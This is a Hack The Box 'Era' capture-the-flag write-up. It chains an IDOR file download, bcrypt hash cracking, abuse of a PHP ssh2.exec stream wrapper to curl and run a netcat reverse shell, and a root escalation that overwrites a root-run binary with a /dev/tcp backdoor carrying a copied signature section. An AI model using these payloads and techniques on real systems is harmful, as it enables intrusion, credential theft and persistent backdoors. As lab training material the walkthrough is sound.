---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - FTP
  - Fuzzing
  - SSRF
  - IDOR
  - PHP-Wrapper-Abuse
  - Signature-Section-Injection
  - Objcopy
---
# Overview

| Name        | Era         |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ sudo nmap -sC -sV 10.10.11.79
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 12:03 PDT
Nmap scan report for 10.10.11.79
Host is up (0.65s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ hostfile --linux 10.10.11.79 era.htb
Added to /etc/hosts:
   10.10.11.79 era.htb

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ hostfile --windows 10.10.11.79 era.htb
Added to /mnt/c/Windows/System32/drivers/etc/hosts:
   10.10.11.79 era.htb
```
## FTP Anonymous Login Failed

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ ftp 10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
Name (10.10.11.79:at0m): anonymous
331 Please specify the password.
Password:

530 Login incorrect.
ftp: Login failed
```
## Port 80

 Seems simple site, contact us button also doesn't work.
# Enumeration
## Fuzzing Directory

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ gobuster dir -u http://era.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 19493]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
```

Nothing interesting.
## Subdomain Fuzzing

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ ffuf -u http://era.htb -H "Host: FUZZ.era.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154

<SNIP>

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 244ms]
```

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ hostfile --windows 10.10.11.79 era.htb file.era.htb
[sudo] password for at0m:
Added to /mnt/c/Windows/System32/drivers/etc/hosts:
   10.10.11.79 era.htb file.era.htb
```

![[era.png]]

You need credentials to use it or you can use security questions but we don't have anything to start with.
## More Fuzzing

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ curl -s -o /dev/null -w "%{size_download}\n" http://file.era.htb/thispagedoesnotexist
6765

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ gobuster dir -u http://file.era.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt \
  -t 40 \
  --exclude-length 6765

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 162]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 9214]
/register.php         (Status: 200) [Size: 3205]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
/layout.php           (Status: 200) [Size: 0]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/LICENSE              (Status: 200) [Size: 34524]
/reset.php            (Status: 302) [Size: 0] [--> login.php]
```

Now we can Register and Login. Tried to upload `.php` file but doesn't seem to have any file upload vulnerability. Upload a file and you get a certain download link with `?id` parameter.
## IDOR 

![[era2.png]]

Copied request as cURL and Generated a Bash script to check for IDOR.

![[era3.png]]

```bash
#!/bin/bash

base_url="http://file.era.htb/download.php?id="

cookie="PHPSESSID=bja5dra1b1qnopq7439tg4e2vi"
user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

start=20
end=20000

for id in $(seq $start $end); do
    response=$(curl -s --max-time 5 "$base_url$id" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.6" \
        -H "Cache-Control: max-age=0" \
        -H "Connection: keep-alive" \
        -H "Sec-GPC: 1" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "User-Agent: $user_agent" \
        -b "$cookie" \
        --insecure)

    if [[ $response != *"File Not Found"* ]]; then
        echo "[+] Valid file found at id=$id"
    else
        echo "[-] No file at id=$id"
    fi
done
```

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/c/Users/At0m/Temp]
└─$ ./script.sh
<SNIP>
[+] Valid file found at id=54
```

![[era4.png]]

We got something interesting so downloaded it.
## More Enumeration

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Users/At0m/Temp/site]
└─$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM files;
54|files/site-backup-30-08-24.zip|1|1725044282
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

None of hashes seems to be crackable using crackstation, So I will use hashcat.
## Hashcat

Tried `eric`:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
```

`Veronica` took too long so I stopped.

Tried `yuri`

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
```

Didn't tried other took too long or seems uncrackable.
## FTP Login

`eric` gave permission denied and `yuri` was able to successfully login. 

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Users/At0m/Temp/pwn101]
└─$ ftp 10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
Name (10.10.11.79:at0m): yuri
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8705|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp> cd apace2_conf
550 Failed to change directory.
ftp> cd php8.1_conf
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||51089|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```

There is different information but nothing seems to be useful for us. Login with creds `yuri:mustang` in site (You can login as new registered user also, I don't think it matters.)
## Login as `Yuri` in Site

We can update security questions as long as we have username, Since we have admin username from above dump `admin_ef01cab31aa`. I updated security questions of Admin.

![[era5.png]]
## Login as Admin

Now with updated Security Questions, we should be able to login.

![[era6.png]]

![[era7.png]]

After logging in, there was `site-backup-30-08-24.zip`, `signing.zip` file which was just useless.

# Exploitation
## Source Code Analysis

If we look at source code of `download.php` site backup we had gotten through IDOR.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Users/At0m/Temp/site]
└─$ cat download.php
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 80vh;
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}


if (!isset($_GET['id'])) {
        header('location: index.php'); // user loaded without requesting file by id
        die();
}

if (!is_numeric($_GET['id'])) {
        header('location: index.php'); // user requested non-numeric (invalid) file id
        die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
        echo deliverTop("Era - Download");

        echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

        echo deliverBottom();
} else {
        $fileName = str_replace("files/", "", $fetched[0]);


        // Allow immediate file download
        if ($_GET['dl'] === "true") {

                header('Content-Type: application/octet-stream');
                header("Content-Transfer-Encoding: Binary");
                header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
                readfile($fetched[0]);
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }


        // Allow simple download
        } else {
                echo deliverTop("Era - Download");
                echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

        }

}


?>
```

This part is interesting for us:

```php
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }
```

Since now we are logged in as `admin` we can use `show` parameter beta feature by adding `&show` parameter to true.

```bash
http://file.era.htb/download.php?id=54&show=true
```

![[era8.png]]
## SSRF + IDOR + PHP Wrapper Abuse

But here lies the critical vulnerability:

```php
// Vulnerable code snippet:
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');

// Why this is vulnerable:
// 1. $wrapper comes directly from user input ($_GET['format']) without sanitization.
// 2. If $wrapper contains a PHP stream wrapper (e.g., php://filter, ssh2.exec, etc.), 
//    the fopen() call concatenates it with $file and executes that wrapper.
// 3. This allows arbitrary file reads (like source code via php://filter) or
//    even remote command execution (via ssh2.exec://) on the server.
// 4. This leads to Local File Inclusion (LFI), Remote Code Execution (RCE),
//    or leaking sensitive data depending on the wrapper used.

// Summary:
// User-controlled input used as a PHP stream wrapper prefix in fopen() without validation => critical RCE/LFI.
```

But if I sent this request:

```html
GET /download.php?id=54&show=true&format=php://filter/read=convert.base64-encode/resource= HTTP/1.1
Host: file.era.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=kkqebbp0ift2okn1s6sns6ris8
Upgrade-Insecure-Requests: 1

```

It will show this:

```html
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Jul 2025 16:47:05 GMT
Content-Type: application/octet-stream
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 103

Opening: php://filter/read=convert.base64-encode/resource=files/site-backup-30-08-24.zip
Resource id #2
```

We don't get `base64` encoded because of this block:

```php
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
echo "Opening: " . $full_path . "\n";
echo $file_content;
```

It will run in system but it wont show us that's why to test we can use [SSH2.EXEC](https://www.php.net/manual/en/function.ssh2-exec.php) wrapper to add reverse shell to our Netcat listener which we will start at our attack machine. 

```php
ssh2.exec://user:pass@host/command
```

But first save `shell.sh` with this payload:

```powershell
PS C:\Users\At0m\AppData\Local\Programs\Python\Python314> type shell.sh
mkfifo /tmp/s; /bin/sh </tmp/s | nc <YOUR_IP> 4444 >/tmp/s; rm /tmp/s
```

```powershell
PS C:\Users\At0m\AppData\Local\Programs\Python\Python314> ./python.exe -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

```

Then in another tab start Netcat listener.

```powershell
PS C:\Users\At0m\Temp\nc.exe> ./nc.exe -nlvp 4444
listening on [any] 4444 ...
```

When I sent this :

```html
GET /download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://10.10.14.207:8000/shell.sh|sh HTTP/1.1
Host: file.era.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kkqebbp0ift2okn1s6sns6ris8
Connection: keep-alive

```

We got this response:

```html
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Jul 2025 17:54:59 GMT
Content-Type: application/octet-stream
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 133

Opening: ssh2.exec://eric:america@127.0.0.1/curl -s http://10.10.14.207:8000/shell.sh|shfiles/site-backup-30-08-24.zip
Resource id #3
```

> I used `yuri` creds at first and got shell but since flag was supposed to be in `eric` home directory, I just changed the creds and did again.

Hmm. Weird we get File received in our Python server but we dont get anything in our Netcat.

```powershell
PS C:\Users\At0m\AppData\Local\Programs\Python\Python314> ./python.exe -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.79 - - [28/Jul/2025 10:55:00] "GET /shell.sh HTTP/1.1" 200 -
```

Not shell but we at least got response. I looked at this part of response:

```
Opening: ssh2.exec://eric:america@127.0.0.1/curl -s http://10.10.14.207:8000/shell.sh|shfiles/site-backup-30-08-24.zip
```

`sh` is being merge with `files` so I added `|` to pipe command and sent again.

```html
GET /download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://10.10.14.207:8000/shell.sh|sh| HTTP/1.1
Host: file.era.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kkqebbp0ift2okn1s6sns6ris8
Connection: keep-alive

```

This time script got received and also we got our shell.

```bash
PS C:\Users\At0m\Temp\nc.exe> ./nc.exe -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.79] 40606
ls
user.txt
cat user.txt
<REDACTED>
```
# Privilege Escalation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.1$  export TERM=xterm
 export TERM=xterm
bash-5.1$
```

```bash
eric@era:~$ ls /
ls /
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
eric@era:~$ ls /home
ls /home
eric  yuri # Not checking yuri directory because I had already done before and it's blank.
eric@era:~$ ls /root
ls /root
ls: cannot open directory '/root': Permission denied
eric@era:~$ ls /opt
ls /opt
AV
eric@era:~$ ls /opt/AV
ls /opt/AV
periodic-checks
eric@era:~$ ls /opt/AV/periodic-checks
ls /opt/AV/periodic-checks
monitor  status.log
eric@era:~$
```

```bash
eric@era:/opt/AV/periodic-checks$ ls -la monitor
ls -la monitor
-rwxrw---- 1 root devs 16544 Jul 28 18:28 monitor
```

`monitor` binary is owned by `root` user but group owned by `devs` group and luckily:

```bash
eric@era:/opt/AV/periodic-checks$ id
id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

We are in `devs` group. We can read and write but can't execute it.
## Option 1: Privilege Escalation via writable Group-owned Binary with Signature Section Injection

1) Write the reverse shell in C.

```bash
echo '#include <stdlib.h>
int main() {
    system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.14.207/9001 0>&1'\''");
    return 0;
}' > backdoor.c
```

```bash
cat backdoor.c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.207/9001 0>&1'");
    return 0;
}
```

2) Compile it statically standalone binary.

```bash
gcc -static -o monitor_backdoor backdoor.c
```

```bash
eric@era:/opt/AV/periodic-checks$ readelf -S monitor
readelf -S monitor
There are 32 section headers, starting at offset 0x38a0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000000318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338
       0000000000000030  0000000000000000   A       0     0     8
  [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c
       0000000000000020  0000000000000000   A       0     0     4
  [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0
       0000000000000024  0000000000000000   A       6     0     8
  [ 6] .dynsym           DYNSYM           00000000000003d8  000003d8
       00000000000000c0  0000000000000018   A       7     1     8
  [ 7] .dynstr           STRTAB           0000000000000498  00000498
       0000000000000093  0000000000000000   A       0     0     1
  [ 8] .gnu.version      VERSYM           000000000000052c  0000052c
       0000000000000010  0000000000000002   A       6     0     2
  [ 9] .gnu.version_r    VERNEED          0000000000000540  00000540
       0000000000000030  0000000000000000   A       7     1     8
  [10] .rela.dyn         RELA             0000000000000570  00000570
       00000000000000c0  0000000000000018   A       6     0     8
  [11] .rela.plt         RELA             0000000000000630  00000630
       0000000000000030  0000000000000018  AI       6    24     8
  [12] .init             PROGBITS         0000000000001000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [13] .plt              PROGBITS         0000000000001020  00001020
       0000000000000030  0000000000000010  AX       0     0     16
  [14] .plt.got          PROGBITS         0000000000001050  00001050
       0000000000000010  0000000000000010  AX       0     0     16
  [15] .plt.sec          PROGBITS         0000000000001060  00001060
       0000000000000020  0000000000000010  AX       0     0     16
  [16] .text             PROGBITS         0000000000001080  00001080
       0000000000000125  0000000000000000  AX       0     0     16
  [17] .fini             PROGBITS         00000000000011a8  000011a8
       000000000000000d  0000000000000000  AX       0     0     4
  [18] .rodata           PROGBITS         0000000000002000  00002000
       0000000000000052  0000000000000000   A       0     0     8
  [19] .eh_frame_hdr     PROGBITS         0000000000002054  00002054
       0000000000000034  0000000000000000   A       0     0     4
  [20] .eh_frame         PROGBITS         0000000000002088  00002088
       00000000000000ac  0000000000000000   A       0     0     8
  [21] .init_array       INIT_ARRAY       0000000000003db0  00002db0
       0000000000000008  0000000000000008  WA       0     0     8
  [22] .fini_array       FINI_ARRAY       0000000000003db8  00002db8
       0000000000000008  0000000000000008  WA       0     0     8
  [23] .dynamic          DYNAMIC          0000000000003dc0  00002dc0
       00000000000001f0  0000000000000010  WA       7     0     8
  [24] .got              PROGBITS         0000000000003fb0  00002fb0
       0000000000000050  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000004000  00003000
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000004010  00003010
       0000000000000008  0000000000000000  WA       0     0     1
  [27] .comment          PROGBITS         0000000000000000  00003010
       000000000000002b  0000000000000001  MS       0     0     1
  [28] .text_sig         PROGBITS         0000000000000000  00003040
       00000000000001ca  0000000000000000           0     0     8
  [29] .symtab           SYMTAB           0000000000000000  00003210
       0000000000000378  0000000000000018          30    18     8
  [30] .strtab           STRTAB           0000000000000000  00003588
       00000000000001ef  0000000000000000           0     0     1
  [31] .shstrtab         STRTAB           0000000000000000  00003777
       0000000000000124  0000000000000000           0     0     1
```

3) Dump the `.text_sig` section from the original.

```bash
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
```

This grabs the **custom signature section** from the real binary  
Now you have a file called `sig`.

> Another method is using this [tool](https://github.com/NUAA-WatchDog/linux-elf-binary-signer/blob/master/README.md) and the file `signing.zip` which we got from logging as admin in site and then using it to sign the binary.

4) Add `.text_sig` to your backdoor

```bash
objcopy --add-section .text_sig=sig monitor_backdoor
```

5) Replace the original binary.

```bash
cp monitor_backdoor /opt/AV/periodic-checks/monitor
```

6) Start your listener in another tab.

```bash
nc -nlvp 9001
```

Make sure permissions are still correct:

```bash
chown root:devs /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```

> `chown: changing ownership of '/opt/AV/periodic-checks/monitor': Operation not permitted` This error is fine.

Now just wait.

```bash
PS C:\Users\At0m\Temp\nc.exe> ./nc.exe -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.79] 34552
bash: cannot set terminal process group (43684): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# ls
ls
answers.sh
clean_monitor.sh
initiate_monitoring.sh
monitor
root.txt
root@era:~# cat root.txt
cat root.txt
<REDACTED>
```

---
